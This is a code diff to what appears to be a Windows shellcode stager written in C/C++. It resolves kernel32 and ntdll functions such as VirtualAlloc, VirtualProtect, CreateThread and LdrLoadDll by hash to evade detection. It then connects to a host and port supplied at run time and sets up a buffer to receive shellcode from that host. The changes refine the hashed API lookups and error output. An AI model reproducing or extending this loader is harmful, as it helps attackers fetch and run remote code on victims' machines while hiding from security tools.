@@ -42,9 +42,9 @@ int run(const char* host, const char* port)
     
     */
 
-    HMODULE kernel32_module = GetModuleHandleManualHash(KERNEL32_DLL_HASH);
+    HMODULE kernel32_module = GetModuleHandleManualHashO(KERNEL32_DLL_HASH);
 	FARPROC funcAddresses[] = {NULL};
-	DWORD hashes[] = {VIRTUALALLOC_HASH, VIRTUALPROTECT_HASH, CREATETHREAD_HASH, WAITFORSINGLEOBJECT_HASH};
+	DWORD hashes[4] = {VIRTUALALLOC_HASH, VIRTUALPROTECT_HASH, CREATETHREAD_HASH, WAITFORSINGLEOBJECT_HASH};
 
 	int val = GetProcAddressManualHashes(
 				kernel32_module, 
@@ -55,7 +55,7 @@ int run(const char* host, const char* port)
 
 	if (val != 0)
 	{
-		printf("error\n");
+		printf("error1: %d\n", val);
 		return 1;
 	}
 	else
@@ -73,8 +73,8 @@ int run(const char* host, const char* port)
     //FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManualHash(kernel32_module, CREATETHREAD_HASH);
     //FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManualHash(kernel32_module, WAITFORSINGLEOBJECT_HASH);
 
-    HMODULE ntdll_module = GetModuleHandleManualHash(NTDLL_DLL_HASH);
-    FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManualHash(ntdll_module, LDRLOADDLL_HASH);
+    HMODULE ntdll_module = GetModuleHandleManualHashO(NTDLL_DLL_HASH);
+    FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManualHashO(ntdll_module, LDRLOADDLL_HASH);
 
     ////////////////////////////////////
     CHAR ModuleName[12] = {0}; // Increase size
@@ -131,7 +131,7 @@ int run(const char* host, const char* port)
 
 	if (val != 0)
 	{
-		printf("error\n");
+		printf("error: %d\n", val);
 		return 1;
 	}
 	else
@@ -200,18 +200,6 @@ int run(const char* host, const char* port)
     //std::cout << "3 - Address resolved" << std::endl;
     // printf("3 - Address resolved\n");
 
-    /*
-    int connected = 0;
-    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next) 
-	{
-        if (pConnect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0) 
-		{
-            connected = 1;
-            break;
-        }
-    }
-    pFreeAddrInfo(result);
-    */
 
     int connected = 0;
     ADDRINFOA *ptr = result; // TODO: no need to assign result to ptr just use result?
@@ -236,10 +224,6 @@ int run(const char* host, const char* port)
     // 2.
     //std::cout << "4 - Connected" << std::endl;
     // printf("4 - Connected\n");
-
-    // 3. 
-    //std::vector<unsigned char> shellcode(4096);
-    //int bytes_received = recv(sock, (char*)shellcode.data(), shellcode.size(), 0);
 
 	unsigned char shellcode[512];
 	//int bytes_received = recv(sock, (char*)shellcode, sizeof(shellcode), 0);
